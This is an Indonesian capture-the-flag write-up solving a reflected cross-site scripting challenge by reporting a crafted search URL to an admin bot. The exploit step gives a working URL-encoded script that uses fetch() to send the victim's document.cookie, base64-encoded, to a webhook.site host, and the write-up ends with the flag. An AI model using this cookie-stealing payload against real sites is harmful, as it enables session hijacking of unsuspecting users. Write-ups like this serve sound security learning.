## Asep buka gudang benderanya hilang
![[Pasted image 20260623144359.png]]
### Enumeration
- dari deskripsi chall : "tiknik lintas jalan" == Cross Site Scripting.
- terdapat input untuk melaportkan suspicious url. (bisa menjadi tempat serangan ke admin)
- search page vuln terhadap Reflected XSS, 
	- Bukti:
	![[Pasted image 20260623145045.png|557]]
	![[Pasted image 20260623145128.png]]
	
Vuln : Reflected XSS
Reflected XSS adalah Vuln yang terjadi ketika Applikasi tidak _perform_ untuk memproses data yang diinput, yang dimana  hal ini penyerang dapat dengan mudah membuat payload untuk menyerang user lain.

Apa yang terjadi? ketika user lain mengunjungi URL yang sudah di constructed oleh Penyerang, maka script yang ada diurl tersebut akan secara otomatis berjalan di browser penyerang yang mengakibatkan Session user/ yang lainnya diambil oleh penyerang. (portswigger Cross-site Scripting)

### Exploit
1. report dengan payload seperti ini 
![[Pasted image 20260623145836.png]]
gagal, jadi kemungkinan karena terdapat simbol special char yang membuat HTTP Requestnya jadi broken.
2. base64 payloadnya biar ga broken.
![[Pasted image 20260623150011.png|581]]
3. report ke admin
`http://web:9000/search?q=%3Cscript%3Efetch%28%27https%3A%2F%2Fwebhook%2Esite%2F9d449d54%2D0a32%2D4006%2Dac36%2Dc02b02e98b08%3Fmwehhe%3D%27%2Bbtoa%28document%2Ecookie%29%29%3B%3C%2Fscript%3E`
![[Pasted image 20260623150108.png]]
4. buka webhook
![[Pasted image 20260623150140.png]]
5. decode datanya dan flag.
![[Pasted image 20260623150206.png]]`Hackfest0x09{Aduuuhhhh_benderanya_ketemu_xD}`